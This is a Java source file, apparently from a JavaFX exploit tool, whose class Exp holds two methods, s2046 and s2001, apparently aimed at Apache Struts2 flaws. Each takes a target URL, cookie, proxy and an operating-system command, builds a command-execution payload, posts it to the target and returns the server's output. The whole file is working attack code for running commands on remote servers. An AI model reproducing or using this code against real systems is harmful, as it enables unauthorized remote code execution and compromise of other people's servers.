package com.example.javafxdemo.Check;

import cn.hutool.http.HttpRequest;
import com.example.javafxdemo.HelloController;
import com.example.javafxdemo.entity.RandomUtils;

import java.util.HashMap;
import java.util.Map;

public class Exp {
    public String s2046(HashMap<String,String> helloinfo,String vulnums) {
        String ua = helloinfo.get("UA");
        String cookie = helloinfo.get("Cookie");
        String target = helloinfo.get("vulurls");
        String exec = helloinfo.get("command");
        String osType = helloinfo.get("osType");
        System.out.println(osType);
        String proxy = helloinfo.get("Proxy");
        if (proxy.equals("")) {
            Map<String, String> vulInfo = Payload.builder()
                    .selectModelAndVul("exec", "s" + vulnums)
                    .selectExec(exec, osType)
                    .VulInfo();
            String payload = vulInfo.get("payload");
            String methodFields = helloinfo.get("methodFields");
            byte[] xx = "".getBytes();
            HttpRequest req = HttpRequest.post(target).timeout(15000).form("x", xx, payload);
            String resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
            String str1 = resp.substring(0, resp.indexOf("Body:"));
            String str2 = resp.substring(str1.length() + 5);
            System.out.println(str2);
            return str2 + "\n";
        } else {
            String proxyhost = proxy.split(":")[0];
            int port = Integer.parseInt(proxy.split(":")[1]);
            String methodFields = helloinfo.get("methodFields");
            Map<String, String> vulInfo = Payload.builder()
                    .selectModelAndVul("exec", "s" + vulnums)
                    .selectExec(exec, osType)
                    .VulInfo();
            String payload = vulInfo.get("payload");
            byte[] xx = "".getBytes();
            HttpRequest req = HttpRequest.post(target).timeout(15000).form("x", xx, payload);
            String resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .setHttpProxy(proxyhost, port)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
            String str1 = resp.substring(0, resp.indexOf("Body:"));
            String str2 = resp.substring(str1.length() + 5);
            System.out.println(str2);
            return str2 + "\n";
        }
    }
    public String s2001(HashMap<String,String> helloinfo,String vulnums) {
        String ua =helloinfo.get("UA") ;
        String cookie = helloinfo.get("Cookie");
        String target=helloinfo.get("vulurls");
        String exec = helloinfo.get("command");
        String osType = helloinfo.get("osType");
        System.out.println(osType);
        String proxy = helloinfo.get("Proxy");
        if (proxy.equals("")) {
            Map<String, String> vulInfo = Payload.builder()
                    .selectModelAndVul("exec", "s"+vulnums)
                    .selectExec(exec, osType)
                    .VulInfo();
            String payload=vulInfo.get("payload");
            String methodFields = helloinfo.get("methodFields");
            byte[] xx = "".getBytes();
            HttpRequest req = HttpRequest.post(target).timeout(15000).body(payload).setConnectionTimeout(15000);
            String resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
            String str1 = resp.substring(0, resp.indexOf("Body:"));
            String str2 = resp.substring(str1.length() + 5);
            System.out.println(str2);
            return str2 + "\n";
        }else {
            String proxyhost = proxy.split(":")[0];
            int port = Integer.parseInt(proxy.split(":")[1]);
            String methodFields = helloinfo.get("methodFields");
            Map<String, String> vulInfo = Payload.builder()
                    .selectModelAndVul("exec", "s"+vulnums)
                    .selectExec(exec, osType)
                    .VulInfo();
            String payload=vulInfo.get("payload");
            byte[] xx = "".getBytes();
            HttpRequest req = HttpRequest.post(target).timeout(15000).body(payload).setConnectionTimeout(15000);
            String resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .setHttpProxy(proxyhost, port)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
            String str1 = resp.substring(0, resp.indexOf("Body:"));
            String str2 = resp.substring(str1.length() + 5);
            System.out.println(str2);
            return str2 + "\n";
        }
    }
}


